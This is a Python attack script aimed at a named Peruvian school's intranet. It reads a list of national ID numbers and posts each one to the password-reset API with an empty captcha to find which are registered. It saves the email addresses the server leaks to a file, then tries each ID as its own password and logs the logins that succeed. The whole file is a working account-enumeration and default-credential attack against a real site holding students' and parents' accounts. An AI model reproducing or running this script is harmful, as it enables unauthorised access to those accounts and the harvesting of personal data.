import requests
from requests.structures import CaseInsensitiveDict
import threading
from pwn import *
from colorama import Fore,init
init()
###CODE BY MONKEY-HK4 09/2022
verde = Fore.LIGHTGREEN_EX
rojo = Fore.LIGHTRED_EX
blanco = Fore.WHITE
cyan = Fore.LIGHTCYAN_EX
reset = Fore.RESET

lista_usuarios = input("lISTA NUMEROS DNI ESTUDIANTES/PADRES: ")
with open(lista_usuarios) as f_obj:
    lines = f_obj.readlines()

def trilce_check():
    for line in lines:
        dni = line.strip()
        # VERIFICAR QUE EL DNI DEL USUARIO EXISTA EN LA PLATAFORMA
        url_olvido_password = "https://intranet.trilce.edu.pe/api/Academico/Intranet/OlvidoContrasenia"
        headers_p = CaseInsensitiveDict()
        headers_p['User-Agent'] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41"
        headers_p['X-Requested-With'] = "XMLHttpRequest"
        headers_p['Origin'] = "http://intranet.trilce.edu.pe"
        headers_p['Referer'] = "https://intranet.trilce.edu.pe/olvido-contrasenia"
        headers_p['Cookie'] = "_gcl_au=1.1.996391256.1651722196; _ga=GA1.3.369441232.1651722199; _fbp=fb.2.1651722199391.993005824; _hjSessionUser_1415085=eyJpZCI6ImJlYTBiZWQ3LWMyMTMtNTNiZC1hNjUzLWM0YTY3ZmNiYTcyMiIsImNyZWF0ZWQiOjE2NTE3MjIyMDA0ODAsImV4aXN0aW5nIjpmYWxzZX0=; G_ENABLED_IDPS=google; _gid=GA1.3.1916970361.1656521090; _gat=1"
        payload_p = {
          "UserName": dni,
          "Captcha": ""
        }
        envio_datos = requests.post(url_olvido_password, headers=headers_p, json=payload_p)
        verificar = envio_datos.text
        if "Se envió un correo a" in verificar:
            log.success(f'{blanco}El usuario {dni} si esta registrado en el colegio trilce.{reset}')
            correo = verificar[23:]
            print(f'{verde}EL USUARIO SI ESTA REGISTRADO, CORREO: "{correo}')
            f = open ('trilce_mails.txt','a')
            f.write('\n' + f'{dni}|{correo}')
            f.close()
            # SI EL DNI EXISTE EN LA PLATAFORMA, SE PRUEBA EL USUARIO Y CONTRASEÑA POR DEFAULT.
            url = "https://intranet.trilce.edu.pe/api/Academico/Intranet/Autenticar"
            headers = {
                "Cookie": "_gcl_au=1.1.1305896466.1662692391; _ga=GA1.3.1653021784.1662692392; _gid=GA1.3.1891039176.1662692392; _gat_gtag_UA_112446135_1=1; _fbp=fb.2.1662692392415.1810474920; _hjSessionUser_1415085=eyJpZCI6IjQ4NTRhZTJkLWMzMGQtNTU0Ny1hMWFjLWQ2ZDMwZDk1NmFjYiIsImNyZWF0ZWQiOjE2NjI2OTIzOTYyMTIsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_1415085=eyJpZCI6ImQwNjM1YjdiLWQwY2MtNDJiNS1iNDI4LTdhY2QxYWVhZDQ5ZiIsImNyZWF0ZWQiOjE2NjI2OTIzOTYzODMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; G_ENABLED_IDPS=google",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://intranet.trilce.edu.pe",
                "Referer": "https://intranet.trilce.edu.pe/login?returnUrl=%2Ftrilce%2Finicio"
            }
            payload = {
              "UserName": dni,
              "Password": dni,
              "Captcha": ""
            }
            resp = requests.post(url, headers=headers, json=payload)
            loguear = resp.json()
            if "introducido es incorrecto" in resp.text:
                log.failure(f"{verde}USUARIO: {dni} | CONTRASEÑA: {dni} | {rojo}MENSAJE: CONTRASEÑA INCORRECTA.{reset}")
            else:
                log.success(f"{verde}USUARIO: {dni} | CONTRASEÑA: {dni} | {verde}MENSAJE: CONTRASEÑA CORRECTA.{reset}")
        else:
            log.failure(f'EL USUARIO {dni} NO ESTA REGISTRADO.{reset}')

# PUEDES AGREGARLE MÁS HILOS.
# POR DEFAULT LO DEJO EN 1.
if __name__ == "__main__":
    threads = list()
    for i in range(1):
        t = threading.Thread(target=trilce_check)
        threads.append(t)
        t.start()

